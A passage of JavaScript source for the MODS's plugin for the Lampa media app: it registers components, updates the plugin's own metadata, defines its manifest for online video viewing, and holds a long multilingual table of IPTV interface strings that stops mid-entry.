		Lampa.Component.add('forktv', forktv);
		Lampa.Component.add('Radio_n', Radio_n);
		Lampa.Component.add('iptv_modss', TVComponent);
		Lampa.Component.add('modss_online', component);
		Lampa.Component.add('collection', collection);
		
		var updatePlugin = function updatePlugin() {
			if (!window.Lampa || !Lampa.Plugins || !Lampa.Plugins.get) return;

			try {
				var plugins = Lampa.Plugins.get();
				var changed = false;
				var name = "MODS's";
				var descr = 'Просмотр онлайн фильмов и сериалов. ТВ через встроенные и добавленные плейлисты. Подписка на выход новых серий в озвучке и появление новых источников.';

				for (var i = 0; i < plugins.length; i++) {
					var plugin = plugins[i];
					if (!plugin || !plugin.url) continue;

					var url = String(plugin.url);

					// Проверяем, относится ли плагин к MODS's
					if (url.indexOf('modss') !== -1) {
						
						// Если у плагина уже есть автор — пропускаем (чтобы не перезаписывать чужие плагины)
						if (plugin.descr !== descr || plugin.author && plugin.author.trim() !== '') {
							continue;
						}

						// Обновляем данные
						if (plugin.author !== name) {
							plugin.author = name;
							changed = true;
						}

						if (!plugin.name || plugin.name.trim() === '') {
							plugin.name = name;
							changed = true;
						}

						if (plugin.descr == descr || plugin.descr !== '') {
							plugin.descr = '';
							changed = true;
						}
					}
				}

				if (changed && typeof Lampa.Plugins.save === 'function') {
					Lampa.Plugins.save();
				}
			} catch (e) {
				console.error('Error in updatePlugin:', e);
			}
		};

		updatePlugin();

		/*
		var plugins = Lampa.Storage.get('plugins','[]');
		plugins.forEach(function(plug) {
			plug.url = (plug.url + '').replace('http://modss.online', 'http://lampa.stream/modss');
		});
		Lampa.Storage.set('plugins',plugins);
		*/
		
		manifest = {
			type: 'video',
			version: version_modss,
			name: "MODS's 💎 v" + version_modss,
			description: 'Онлайн просмотр (22 Balansers, 18 in VIP)',
			component: 'modss_online',
			onContextMenu: function onContextMenu(object) {
				return {
					name: Lampa.Lang.translate('online_watch'),
					description: ''
				};
			},
			onContextLauch: function onContextLauch(object) {
				Lampa.Activity.push({
					url: '',
					title: "MODS's 💎 v" + version_modss,
					component: 'modss_online',
					search: object.title,
					search_one: object.title,
					search_two: object.original_title,
					movie: object,
					page: 1
				});
			}
		};
		Lampa.Manifest.plugins = manifest;
		
		if (!window.plugin_iptv_modss_ready) startPluginTV();
		
		
		if (!Lampa.Lang) {
			var lang_data = {};
			Lampa.Lang = {
				add: function (data) {
					lang_data = data;
				},
				translate: function (key) {
					return lang_data[key] ? lang_data[key].ru : key;
				}
			}
		}
		Lampa.Lang.add({
	online_click_here: {
		ru: 'Нажмите здесь для выбора источника',
		uk: 'Натисніть тут для вибору джерела',
		en: 'Click here to select source',
		be: 'Націсніце тут для выбару крыніцы',
		zh: '点击此处选择来源',
		bg: 'Кликнете тук, за да изберете източник',
		cs: 'Kliknutím sem vyberete zdroj',
		fr: 'Cliquez ici pour sélectionner la source',
		he: 'לחץ כאן כדי לבחור מקור',
		pt: 'Clique aqui para selecionar a fonte',
		ro: 'Faceți clic aici pentru a selecta sursa'
	},
	iptv_noprogram: {
		ru: 'Нет программы',
		en: 'No program',
		uk: 'Немає програми',
		be: 'Няма праграмы',
		zh: '没有节目',
		pt: 'Nenhum programa',
		bg: 'Няма програми',
		cs: 'Žádný program',
		fr: 'Aucun programme',
		he: 'אין תוכנית',
		ro: 'Niciun program'
	},
	iptv_noload_playlist: {
		ru: 'К сожалению, загрузка плейлиста не удалась. Возможно, ваш провайдер заблокировал загрузку из внешних источников.',
		en: 'Unfortunately, the playlist download failed. Your ISP may have blocked downloads from external sources.',
		uk: 'На жаль, завантаження плейлиста не вдалося. Можливо, ваш провайдер заблокував завантаження із зовнішніх джерел.',
		be: 'Нажаль, загрузка плэйліста не атрымалася. Магчыма, ваш правайдэр заблакаваў загрузку са знешніх крыніц.',
		zh: '不幸的是，播放列表下载失败。 您的 ISP 可能已阻止从外部来源下载。',
		pt: 'Infelizmente, o download da lista de reprodução falhou. Seu ISP pode ter bloqueado downloads de fontes externas.',
		bg: 'За съжаление, свалянето на плейлистата се провали. Вашият доставчик може да блокира сваляне от външни източници.',
		cs: 'Bohužel se nepodařilo stáhnout seznam skladeb. Váš ISP možná zablokoval stahování z externích zdrojů.',
		fr: 'Malheureusement, le téléchargement de la playlist a échoué. Votre FAI a peut-être bloqué les téléchargements à partir de sources externes.',
		he: 'למרבה הצער, הורדת הפלייליסט נכשלה. ייתכן שספק האינטרנט שלך חסם הורדות ממקורות חיצוניים.',
		ro: 'Din păcate, descărcarea listei de redare a eșuat. Este posibil ca ISP-ul dvs. să fi blocat descărcări din surse externe.'
	},
	iptv_select_playlist: {
		ru: 'Выберите плейлист',
		en: 'Choose a playlist',
		uk: 'Виберіть плейлист',
		be: 'Выберыце плэйліст',
		zh: '选择一个播放列表',
		pt: 'Escolha uma lista de reprodução',
		bg: 'Изберете плейлист',
		cs: 'Vyberte seznam skladeb',
		fr: 'Choisissez une playlist',
		he: 'בחר רשימת השמעה',
		ro: 'Alegeți o listă de redare'
	},
	iptv_all_channels: {
		ru: 'Все каналы',
		en: 'All channels',
		uk: 'Усі канали',
		be: 'Усе каналы',
		zh: '所有频道',
		pt: 'Todos os canais',
		bg: 'Всички канали',
		cs: 'Všechny kanály',
		fr: 'Toutes les chaînes',
		he: 'כל הערוצים',
		ro: 'Toate canalele'
	},
	iptv_add_fav: {
		ru: 'Добавить в избранное',
		en: 'Add to favorites',
		uk: 'Додати в обране',
		be: 'Дадаць у абранае',
		zh: '添加到收藏夹',
		pt: 'Adicionar aos favoritos',
		bg: 'Добави в избрани',
		cs: 'Přidat k oblíbeným',
		fr: 'Ajouter aux favoris',
		he: 'הוסף למועדפים',
		ro: 'Adăugați la favorite'
	},
	iptv_remove_fav: {
		ru: 'Убрать из избранного',
		en: 'Remove from favorites',
		uk: 'Прибрати з вибраного',
		be: 'Прыбраць з абранага',
		zh: '从收藏夹中删除',
		pt: 'Remover dos favoritos',
		bg: 'Премахни от избрани',
		cs: 'Odebrat z oblíbených',
		fr: 'Supprimer des favoris',
		he: 'הסר מהמועדפים',
		ro: 'Eliminați din favorite'
	},
	iptv_playlist_empty: {
		ru: 'Пока ничего не добавлено.',
		en: 'Nothing added yet.',
		uk: 'Поки нічого не додано.',
		be: 'Пакуль нічога не дадана.',
		zh: '暂无添加。',
		pt: 'Nada adicionado ainda.',
		bg: 'Все още нищо не е добавено.',
		cs: 'Zatím nic přidáno.',
		fr: 'Rien d\'ajouté pour l\'instant.',
		he: 'עדיין לא התווסף כלום.',
		ro: 'Nimic adăugat încă.'
	},
	iptv_modss_select_playlist_text: {
		ru: 'Плейлисты загружены на сервере.',
		en: 'Playlists are loaded on the server.',
		uk: 'Плейлисти завантажені на сервері.',
		be: 'Плэйлісты загружаны на сэрвэры.',
		zh: '播放列表已加载到服务器上。',
		pt: 'Listas de reprodução carregadas no servidor.',
		bg: 'Плейлистите са заредени на сървъра.',
		cs: 'Playlisty se načítají na server.',
		fr: 'Les playlists sont chargées sur le serveur.',
		he: 'רשימות השמעה נטענות בשרת.',
		ro: 'Listele de redare sunt încărcate pe server.'
	},
	iptv_modss_playlist_empty: {
		ru: 'Нет загруженных плейлистов на сервере.',
		en: 'No playlists uploaded on the server.',
		uk: 'Немає завантажених плейлистів на сервері.',
		be: 'Няма загружаных плэйлістаў на сэрвэры.',
		zh: '服务器上没有播放列表。',
		pt: 'Nenhuma lista de reprodução no servidor.',
		bg: 'Няма заредени плейлисти на сървъра.',
		cs: 'Na server nejsou nahrány žádné seznamy skladeb.',
		fr: 'Aucune playlist téléchargée sur le serveur.',
		he: 'לא הועלו רשימות השמעה לשרת.',
		ro: 'Nu au fost încărcate liste de redare pe server.'
	},
	iptv_select_playlist_text: {
		ru: 'Для того чтобы добавить свой плейлист, перейдите в Telegram-бот <span class="iptv-link">@modssmy_bot</span> и добавьте плейлист от вашего провайдера.',
		en: 'To add your playlist, go to the Telegram MODSS_BOT <span class="iptv-link">@modssmy_bot</span> and add a playlist from your provider.',
		uk: 'Щоб додати свій плейлист, перейдіть в Telegram-бот <span class="iptv-link">@modssmy_bot</span> і додайте плейлист від вашого провайдера.',
		be: 'Каб дадаць свой плэйліст, перайдзіце ў Telegram-бот <span class="iptv-link">@modssmy_bot</span> і дадайце плэйліст ад вашага правайдэра.',
		zh: '要添加您的播放列表，请前往 Telegram 机器人 <span class="iptv-link">@modssmy_bot</span> 并添加来自您的提供商的播放列表。',
		pt: 'Para adicionar sua lista de reprodução, acesse o MODSS_BOT do Telegram <span class="iptv-link">@modssmy_bot</span> e adicione uma lista do seu provedor.',
		bg: 'За да добавите ваша листа, отидете в Telegram бот <span class="iptv-link">@modssmy_bot</span> и добавете листа от вашият доставчик.',
		cs: 'Chcete-li přidat svůj seznam skladeb, přejděte na telegram MODSS_BOT <span class="iptv-link">@modssmy_bot</span> a přidejte seznam skladeb od svého poskytovatele.',
		fr: 'Pour ajouter votre playlist, accédez au Telegram MODSS_BOT <span class="iptv-link">@modssmy_bot</span> et ajoutez une playlist de votre fournisseur.',
		he: 'כדי להוסיף את רשימת ההשמעה שלך, עבור אל Telegram MODSS_BOT <span class="iptv-link">@modssmy_bot</span> והוסף רשימת השמעה מהספק שלך.',
		ro: 'Pentru a adăuga lista de redare, accesați Telegram MODSS_BOT <span class="iptv-link">@modssmy_bot</span> și adăugați o listă de redare de la furnizorul dvs.'
	},
	iptv_updated: {
		ru: 'Обновлено',
		en: 'Updated',
		uk: 'Оновлено',
		be: 'Абноўлена',
		zh: '更新',
		pt: 'Atualizada',
		bg: 'Обновено',
		cs: 'Aktualizováno',
		fr: 'Mis à jour',
		he: 'מְעוּדכָּן',
		ro: 'Actualizat'
	},
	iptv_update: {
		ru: 'Обновление',
		en: 'Update',
		uk: 'Оновлення',
		be: 'Абнаўленне',
		zh: '更新',
		pt: 'Atualizar',
		bg: 'Обновяване',
		cs: 'Aktualizovat',
		fr: 'Mise à jour',
		he: 'לְעַדְכֵּן',
		ro: 'Actualizare'
	},
	iptv_active: {
		ru: 'Активно',
		en: 'Actively',
		uk: 'Активно',
		be: 'Актыўна',
		zh: '积极地',
		pt: 'Ativamente',
		bg: 'Активно',
		cs: 'Aktivně',
		fr: 'Activement',
		he: 'באופן פעיל',
		ro: 'Activ'
	},
	iptv_yesterday: {
		ru: 'Вчера',
		en: 'Yesterday',
		uk: 'Вчора',
		be: 'Учора',
		zh: '昨天',
		pt: 'Ontem',
		bg: 'Вчера',
		cs: 'Včera',
		fr: 'Hier',
		he: 'אֶתמוֹל',
		ro: 'Ieri'
	},
	iptv_today: {
		ru: 'Сегодня',
		en: 'Today',
		uk: 'Сьогодні',
		be: 'Сёння',
		zh: '今天',
		pt: 'Hoje',
		bg: 'Днес',
		cs: 'Dnes',
		fr: 'Aujourd\'hui',
		he: 'הַיוֹם',
		ro: 'Astăzi'
	},
	iptv_tomorrow: {
		ru: 'Завтра',
		en: 'Tomorrow',
		uk: 'Завтра',
		be: 'Заўтра',
		zh: '明天',
		pt: 'Amanhã',
		bg: 'Утре',
		cs: 'Zítra',
		fr: 'Demain',
		he: 'מָחָר',
		ro: 'Mâine'
	},
	iptv_remove_cache: {
		ru: 'Удалить кеш',
		en: 'Delete cache',
		uk: 'Видалити кеш',
		be: 'Выдаліць кэш',
		zh: '删除缓存',
		pt: 'Excluir cache',
		bg: 'Изтриване на кеш',
		cs: 'Vymazat mezipaměť',
		fr: 'Supprimer le cache',
		he: 'מחק מטמון',
		ro: 'Ștergeți memoria cache'
	},
	iptv_remove_cache_descr: {
		ru: 'Удалить плейлист из кеша',
		en: 'Delete playlist from cache',
		uk: 'Видалити плейлист з кешу',
		be: 'Выдаліць плэйліст з кэшу',
		zh: '从缓存中删除播放列表',
		pt: 'Excluir lista de reprodução do cache',
		bg: 'Изтрий плейлиста от кеша',
		cs: 'Smazat seznam skladeb z mezipaměti',
		fr: 'Supprimer la playlist du cache',
		he: 'מחק רשימת השמעה מהמטמון',
		ro: 'Șterge lista de redare din cache'
	},
	iptv_params_always: {
		ru: 'Всегда',
		en: 'Always',
		uk: 'Завжди',
		be: 'Заўсёды',
		zh: '总是',
		pt: 'Sempre',
		bg: 'Винаги',
		cs: 'Vždy',
		fr: 'Toujours',
		he: 'תָמִיד',
		ro: 'Întotdeauna'
	},
	iptv_params_hour: {
		ru: 'Каждый час',
		en: 'Each hour',
		uk: 'Кожну годину',
		be: 'Кожную гадзіну',
		zh: '每小时',
		pt: 'Cada hora',
		bg: 'Всеки час',
		cs: 'Každou hodinu',
		fr: 'Chaque heure',
		he: 'כל שעה',
		ro: 'În fiecare oră'
	},
	iptv_params_hour12: {
		ru: 'Каждые 12 часов',
		en: 'Every 12 hours',
		uk: 'Кожні 12 годин',
		be: 'Кожныя 12 гадзін',
		zh: '每12小时',
		pt: 'A cada 12 horas',
		bg: 'Всеки 12 часа',
		cs: 'Každých 12 hodin',
		fr: 'Toutes les 12 heures',
		he: 'כל 12 שעות',
		ro: 'La fiecare 12 ore'
	},
	iptv_params_day: {
		ru: 'Ежедневно',
		en: 'Daily',
		uk: 'Щодня',
		be: 'Штодня',
		zh: '日常的',
		pt: 'Diário',
		bg: 'Ежедневно',
		cs: 'Denní',
		fr: 'Tous les jours',
		he: 'יוֹמִי',
		ro: 'Zilnic'
	},
	iptv_params_week: {
		ru: 'Еженедельно',
		en: 'Weekly',
		uk: 'Щотижня',
		be: 'Штотыдзень',
		zh: '每周',
		pt: 'Semanalmente',
		bg: 'Седмично',
		cs: 'Týdně',
		fr: 'Hebdomadaire',
		he: 'שְׁבוּעִי',
		ro: 'Săptămânal'
	},
	iptv_params_none: {
		ru: 'Никогда',
		en: 'Never',
		uk: 'Ніколи',
		be: 'Ніколі',
		zh: '绝不',
		pt: 'Nunca',
		bg: 'Никога',
		cs: 'Nikdy',
		fr: 'Jamais',
		he: 'לְעוֹלָם לֹא',
		ro: 'Nu'
	},
	iptv_loading: {
		ru: 'Метод загрузки',
		en: 'Download method',
		uk: 'Метод завантаження',
		be: 'Метад загрузкі',
		zh: '下载方式',
		pt: 'Método de download',
		bg: 'Метод на зареждане',
		cs: 'Metoda stahování',
		fr: 'Méthode de téléchargement',
		he: 'שיטת הורדה',
		ro: 'Metoda de descărcare'
	},
	iptv_update_app_title: {
		ru: 'Обновите приложение',
		en: 'Update the app',
		uk: 'Оновлення програми',
		be: 'Абнавіце дадатак',
		zh: '更新应用程序',
		pt: 'Atualize o aplicativo',
		bg: 'Обновни приложение',
		cs: 'Aktualizujte aplikaci',
		fr: 'Mettre à jour l\'application',
		he: 'עדכן את האפליקציה',
		ro: 'Actualizați aplicația'
	},
	iptv_update_app_text: {
		ru: 'К сожалению, для работы плагина необходимо обновить вашу лампу путем ее перезагрузки. Она устарела и без этой процедуры плагин не будет функционировать.',
		en: 'Unfortunately, for the plugin to work, you need to update your lamp by rebooting it. It is outdated and without this procedure the plugin will not function.',
		uk: 'На жаль, для роботи плагіна необхідно оновити лампу шляхом її перезавантаження. Вона застаріла і без цієї процедури плагін не функціонуватиме.',
		be: 'Нажаль, для працы плагіна неабходна абнавіць вашу лямпу шляхам яе перазагрузкі. Яна састарэлая і без гэтай працэдуры плягін не будзе функцыянаваць.',
		zh: '不幸的是，要使插件正常工作，您需要通过重新启动来更新灯泡。 它已过时，如果没有此程序，插件将无法运行。',
		pt: 'Infelizmente, para que o plug-in funcione, você precisa atualizar sua lâmpada reiniciando-a. Está desatualizado e sem este procedimento o plugin não funcionará.',
		bg: 'За съжаление, за да работи добавка, трябва да обновите вашата Lampa и да я рестартирате. Приложението не е актуално и без тази процедура добавката не може да работи',
		cs: 'Bohužel, aby plugin fungoval, musíte lampu aktualizovat restartováním. Je zastaralý a bez tohoto postupu nebude plugin fungovat.',
		fr: 'Malheureusement, pour que le plugin fonctionne, vous devez mettre à jour votre lampe en la redémarrant. Il est obsolète et sans cette procédure le plugin ne fonctionnera pas.',
		he: 'לרוע המזל, כדי שהתוסף יפעל, עליך לעדכן את המנורה שלך על ידי אתחולה מחדש. הוא מיושן וללא הליך זה התוסף לא יפעל.',
		ro: 'Din păcate, pentru ca pluginul să funcționeze, trebuie să actualizați lampa repornind-o. Este depășit și fără această procedură pluginul nu va funcționa.'
	},
	iptv_param_sort_add: {
		ru: 'По добавлению',
		en: 'By addition',
		uk: 'За додаванням',
		be: 'Па даданні',
		zh: '按添加时间',
		pt: 'Por adição',
		bg: 'По добавяне',
		cs: 'Sčítáním',
		fr: 'Par ajout',
		he: 'לפי תוספת',
		ro: 'Prin adaos'
	},
	iptv_param_sort_name: {
		ru: 'По названию',
		en: 'By name',
		uk: 'За назвою',
		be: 'Па назве',
		zh: '按名称',
		pt: 'Por nome',
		bg: 'По име',
		cs: 'Podle jména',
		fr: 'Par nom',
		he: 'לפי השם',
		ro: 'După nume'
	},
	iptv_param_sort_view: {
		ru: 'По просмотрам',
		en: 'By views',
		uk: 'За переглядами',
		be: 'Па праглядах',
		zh: '按观看次数',
		pt: 'Por visualizações',
		bg: 'По прегледи',
		cs: 'Podle zobrazení',
		fr: 'Par vues',
		he: 'לפי השקפות',
		ro: 'După vederi'
	},
	iptv_param_sort_favorite: {
		ru: 'Сортировать избранное',
		en: 'Sort by favorite',
		uk: 'Сортувати в обраному',
		be: 'Сартаваць па выбраным',
		zh: '按收藏排序',
		pt: 'Classificar por favoritos',
		bg: 'Сортиране по избрани',
		cs: 'Seřadit podle oblíbených',
		fr: 'Trier par favori',
		he: 'מיין לפי מועדפים',
		ro: 'Sortați după favorit'
	},
	iptv_param_save_favorite: {
		ru: 'Метод хранения избранного',
		en: 'Favorite storage method',
		uk: 'Спосіб зберігання обраного',
		be: 'Метад захоўвання абранага',
		zh: '收藏存储方法',
		pt: 'Método de armazenamento favorito',
		bg: 'Начин на сърханение на фаворити',
		cs: 'Oblíbený způsob ukládání',
		fr: 'Méthode de stockage préférée',
		he: 'שיטת אחסון מועדפת',
		ro: 'Metoda de stocare preferată'
	},
	iptv_param_save_favorite_url: {
		ru: 'По адресу канала',
		en: 'By channel URL',
		uk: 'За URL-адресою каналу',
		be: 'Па URL-адрэсе канала',
		zh: '按频道网址',
		pt: 'Por URL do canal',
		bg: 'По URL на канала',
		cs: 'Podle adresy URL kanálu',
		fr: 'Par URL de chaîne',
		he: 'לפי כתובת האתר של הערוץ',
		ro: 'După adresa URL a canalului'
	},
	iptv_param_save_favorite_name: {
		ru: 'По названию канала',
		en: 'By channel name',
		uk: 'За назвою каналу',
		be: 'Па назве канала',
		zh: '按频道名称',
		pt: 'Por nome do canal',
		bg: 'По име на канала',
		cs: 'Podle názvu kanálu',
		fr: 'Par nom de chaîne',
		he: 'לפי שם הערוץ',
		ro: 'După numele canalului'
	},
	iptv_param_use_db: {
		ru: 'Использовать базу данных',
		en: 'Use database',
		uk: 'Використовувати базу даних',
		be: 'Выкарыстоўваць базу дадзеных',
		zh: '使用数据库',
		pt: 'Utilizar banco de dados',
		bg: 'Използвайки база данни',
		cs: 'Použijte databázi',
		fr: 'Utiliser la base de données',
		he: 'השתמש במסד נתונים',
		ro: 'Utilizați baza de date'
	},
	iptv_modss_view_tiles: {
		ru: 'Плитки',
		en: 'Tiles',
		uk: 'Плитки',
		be: 'Пліткі',
		zh: '磁贴',
		pt: 'Blocos',
		bg: 'Плочки',
		cs: 'Dlaždice',
		fr: 'Carrelage',
		he: 'אריחים',
		ro: 'Placi'
	},
	iptv_modss_view_list: {
		ru: 'Список',
		en: 'List',
		uk: 'Список',
		be: 'Спіс',
		zh: '列表',
		pt: 'Lista',
		bg: 'Списък',
		cs: 'Seznam',
		fr: 'Liste',
		he: 'רְשִׁימָה',
		ro: 'Listă'
	},
	iptv_remind: {
		ru: 'Напоминание',
		en: 'Reminder',
		uk: 'Нагадування',
		bg: 'Напомняне',
		cs: 'Připomínka',
		fr: 'Rappel',
		he: 'תִזכּוֹרֶת',
		pt: 'Lembrete',
		ro: 'Memento'
	},
	iptv_remind_set: {
		ru: 'Поставить напоминание',
		en: 'Set reminder',
		uk: 'Встановити нагадування',
		bg: 'Задайте напомняне',
		cs: 'Nastavit připomenutí',
		fr: 'Définir un rappel',
		he: 'הגדר תזכורת',
		pt: 'Definir lembrete',
		ro: 'Setați memento'
	},
	iptv_remind_remove: {
		ru: 'Убрать напоминание',
		en: 'Remove reminder',
		uk: 'Видалити нагадування',
		bg: 'Премахване на напомняне',
		cs: 'Odebrat připomenutí',
		fr: 'Supprimer le rappel',
		he: 'הסר תזכורת',
		pt: 'Remover lembrete',
		ro: 'Eliminați mementoul'
	},
	iptv_remind_soon: {
		ru: 'Скоро начнётся',
		en: 'Starting soon',
		uk: 'Скоро починається',
		bg: 'Започва скоро',
		cs: 'Již brzy',
		fr: 'Bientôt',
		he: 'מתחילים בקרוב',
		pt: 'Começando em breve',
		ro: 'Începând în curând'
	},
	iptv_remind_set_ok: {
		ru: 'Напоминание установлено',
		en: 'Reminder set',
		uk: 'Нагадування встановлено',
		bg: 'Зададено напомняне',
		cs: 'Sada připomenutí',
		fr: 'Ensemble de rappel',
		he: 'תזכורת מוגדרת',
		pt: 'Conjunto de lembretes',
		ro: 'Set de mementouri'
	},
	iptv_remind_remove_ok: {
		ru: 'Напоминание удалено',
		en: 'Reminder removed',
		uk: 'Нагадування видалено',
		bg: 'Напомнянето е премахнато',
		cs: 'Připomenutí odstraněno',
		fr: 'Rappel supprimé',
		he: 'התזכורת הוסרה',
		pt: 'Lembrete removido',
		ro: 'Memento a fost eliminat'
	},
	iptv_remind_switch: {
		ru: 'Переключить',
		en: 'Switch',
		uk: 'Переключити',
		bg: 'Превключване',
		cs: 'Přepínač',
		fr: 'Changer',
		he: 'מֶתֶג',
		pt: 'Trocar',
		ro: 'Comutator'
	},
	iptv_remind_dismiss: {
		ru: 'Закрыть',
		en: 'Dismiss',
		uk: 'Закрити',
		bg: 'Отхвърляне',
		cs: 'Propustit',
		fr: 'Rejeter',
		he: 'לְפַטֵר',
		pt: 'Liberar',
		ro: 'Respingeți'
	},
	iptv_program_description: {
		ru: 'Описание',
		en: 'Description',
		uk: 'Опис',
		bg: 'Описание',
		cs: 'Popis',
		fr: 'Description',
		he: 'תֵאוּר',
		pt: 'Descrição',
		ro: 'Descriere'
	},
	iptv_program_watch: {
		ru: 'Смотреть',
		en: 'Watch',
		uk: 'Дивитися',
		bg: 'Гледай',
		cs: 'Hodinky',
		fr: 'Montre',
		he: 'לִצְפּוֹת',
		pt: 'Assistir',
		ro: 'Ceas'
	},
	iptv_program_archive: {
		ru: 'В архив',
		en: 'To archive',
		uk: 'В архів',
		bg: 'За архивиране',
		cs: 'K archivaci',
		fr: 'Pour archiver',
		he: 'לארכיון',
		pt: 'Para arquivar',
		ro: 'Pentru a arhiva'
	},
	iptv_program_ended: {
		ru: 'Передача уже закончилась',
		en: 'Program has ended',
		uk: 'Передача вже закінчилась',
		bg: 'Програмата приключи',
		cs: 'Program skončil',
		fr: 'Le programme est terminé',
		he: 'התוכנית הסתיימה',
		pt: 'O programa terminou',
		ro: 'Programul s-a încheiat'
	},
	iptv_remind_ended: {
		ru: 'Нельзя подписаться на закончившуюся передачу',
		en: 'Cannot subscribe to ended program',
		uk: 'Не можна підписатися на закінчену передачу',
		bg: 'Не можете да се абонирате за приключила програма',
		cs: 'Nelze se přihlásit k odběru ukončeného programu',
		fr: 'Impossible de s\'abonner au programme terminé',
		he: 'לא ניתן להירשם לתוכנית שהסתיימה',
		pt: 'Não é possível assinar o programa encerrado',
		ro: 'Nu se poate abona la programul încheiat'
	},
	iptv_param_guide: {
		ru: 'Телегид',
		en: 'TV Guide',
		uk: 'Телегід',
		be: 'Тэлегід',
		zh: '电视指南',
		pt: 'Guia de TV',
		bg: 'Телевизионен справочник',
		cs: 'TV průvodce',
		fr: 'Guide télé',
		he: 'מדריך טלוויזיה',
		ro: 'Ghid TV'
	},
	iptv_search_no_result: {
		ru: 'Нет результатов по запросу',
		en: 'No results found',
		uk: 'Немає результатів за запитом',
		be: 'Няма вынікаў па запыце',
		zh: '未找到结果',
		pt: 'Nenhum resultado encontrado',
		bg: 'Няма намерени резултати',
		cs: 'Nebyly nalezeny žádné výsledky',
		fr: 'Aucun résultat trouvé',
		he: 'לא נמצאו תוצאות',
		ro: 'Nu s-au găsit rezultate'
	},
	iptv_guide_status_update_wait: {
		ru: 'Идет процесс обновления, подождите...',
		en: 'Updating process in progress, please wait...',
		uk: 'Йде процес оновлення, зачекайте...',
		be: 'Ідзе працэс абнаўлення, калі ласка, пачакайце...',
		zh: '更新过程正在进行，请稍等...',
		pt: 'Processo de atualização em andamento, aguarde...',
		bg: 'Процесът на актуализация е в ход, моля изчакайте...',
		cs: 'Probíhá aktualizace, čekejte prosím...',
		fr: 'Processus de mise à jour en cours, veuillez patienter...',
		he: 'תהליך העדכון מתבצע, אנא המתן...',
		ro: 'Procesul de actualizare este în curs, așteptați...'
	},
	iptv_guide_status_update: {
		ru: 'Идет обновление',
		en: 'Update in progress',
		uk: 'Йде оновлення',
		be: 'Ідзе абнаўленне',
		zh: '更新进行中',
		pt: 'Atualização em andamento',
		bg: 'Актуализация в ход',
		cs: 'Probíhá aktualizace',
		fr: 'Mise à jour en cours',
		he: 'עדכון מתבצע',
		ro: 'Actualizare în curs'
	},
	iptv_guide_status_parsing: {
		ru: 'Парсинг',
		en: 'Parsing',
		uk: 'Аналіз',
		be: 'Аналіз',
		zh: '解析中',
		pt: 'Analisando',
		bg: 'Анализ',
		cs: 'Analýza',
		fr: 'Analyse',
		he: 'ניתוח',
		ro: 'Analizând'
	},
	iptv_guide_status_finish: {
		ru: 'Статус последнего обновления',
		en: 'Status of the last update',
		uk: 'Статус останнього оновлення',
		be: 'Статус апошняга абнаўлення',
		zh: '最后更新状态',
		pt: 'Estado da última atualização',
		bg: 'Състояние на последното обновление',
		cs: 'Stav poslední aktualizace',
		fr: 'Statut de la dernière mise à jour',
		he: 'סטטוס העדכון האחרון',
		ro: 'Starea ultimei actualizări'
	},
	iptv_guide_status_channels: {
		ru: 'Каналов',
		en: 'Channels',
		uk: 'Каналів',
		be: 'Каналаў',
		zh: '频道',
		pt: 'Canais',
		bg: 'Канали',
		cs: 'Kanály',
		fr: 'Canaux',
		he: 'ערוצים',
		ro: 'Canale'
	},
	iptv_guide_status_date: {
		ru: 'обновлено',
		en: 'updated',
		uk: 'оновлено',
		be: 'абноўлена',
		zh: '已更新',
		pt: 'atualizado',
		bg: 'обновено',
		cs: 'aktualizováno',
		fr: 'mis à jour',
		he: 'מְעוּדכָּן',
		ro: 'actualizat'
	},
	iptv_guide_status_noupdates: {
		ru: 'Еще нет обновлений',
		en: 'No updates yet',
		uk: 'Ще немає оновлень',
		be: 'Яшчэ няма абнаўленняў',
		zh: '暂无更新',
		pt: 'Ainda sem atualizações',
		bg: 'Все още няма актуализации',
		cs: 'Zatím žádné aktualizace',
		fr: 'Aucune mise à jour pour l\'instant',
		he: 'עדיין אין עדכונים',
		ro: 'Nu există actualizări încă'
	},
	iptv_guide_error_link: {
		ru: 'Укажите ссылку на телегид',
		en: 'Specify the TV guide link',
		uk: 'Вкажіть посилання на телегід',
		be: 'Пакажыце спасылку на тэлегід',
		zh: '请指定电视指南链接',
		pt: 'Indique o link do guia de TV',
		bg: 'Посочете връзката към телегида',
		cs: 'Zadejte odkaz na TV průvodce',
		fr: 'Spécifiez le lien du guide TV',
		he: 'ציין את הקישור למדריך הטלוויזיה',
		ro: 'Specificați linkul pentru ghidul TV'
	},
	iptv_param_guide_custom_title: {
		ru: 'Использовать свою ссылку',
		en: 'Use your own link',
		uk: 'Використовуйте своє посилання',
		be: 'Выкарыстоўвайце сваю спасылку',
		zh: '使用您自己的链接',
		pt: 'Use seu próprio link',
		bg: 'Използвайте своята връзка',
		cs: 'Použijte svůj vlastní odkaz',
		fr: 'Utilisez votre propre lien',
		he: 'השתמש בקישור משלך',
		ro: 'Folosește-ți propriul link'
	},
	iptv_param_guide_custom_descrs: {
		ru: 'Укажите свою ссылку на телегид, если не хотите использовать телегид от MODSS',
		en: 'Specify your TV guide link if you do not want to use the MODSS TV guide',
		uk: 'Вкажіть своє посилання на телегід, якщо ви не хочете використовувати телегід від MODSS',
		be: 'Пакажыце сваю спасылку на тэлегід, калі вы не хочаце выкарыстоўваць тэлегід ад MODSS',
		zh: '如果您不想使用MODSS电视指南，请指定您的电视指南链接',
		pt: 'Especifique seu link do guia de TV se não quiser usar o guia de TV da MODSS',
		bg: 'Уточнете своята връзка към телегида, ако не искате да използвате този на MODSS',
		cs: 'Pokud nechcete používat TV průvodce MODSS, zadejte odkaz na svého TV průvodce',
		fr: 'Précisez le lien de votre guide TV si vous ne souhaitez pas utiliser le guide TV MODSS',
		he: 'ציין את הקישור למדריך הטלוויזיה שלך אם אינך רוצה להשתמש במדריך הטלוויזיה של MODSS',
		ro: 'Specificați linkul pentru ghidul TV dacă nu doriți să utilizați ghidul TV MODSS'
	},
	iptv_param_guide_url_descr: {
		ru: 'Укажите свою ссылку на телегид EPG',
		en: 'Specify your EPG TV guide link',
		uk: 'Вкажіть своє посилання на телегід EPG',
		be: 'Пакажыце сваю спасылку на тэлегід EPG',
		zh: '请指定您的电视指南EPG链接',
		pt: 'Especifique seu link do guia de TV EPG',
		bg: 'Уточнете своята връзка към телегида EPG',
		cs: 'Zadejte odkaz na EPG TV průvodce',
		fr: 'Spécifiez le lien de votre guide TV EPG',
		he: 'ציין את הקישור למדריך הטלוויזיה של ה-EPG שלך',
		ro: 'Specificați linkul pentru ghidul TV EPG'
	},
	iptv_param_guide_interval_title: {
		ru: 'Интервал обновления',
		en: 'Update Interval',
		uk: 'Інтервал оновлення',
		be: 'Інтэрвал абнаўлення',
		zh: '更新间隔',
		pt: 'Intervalo de atualização',
		bg: 'Интервал за актуализация',
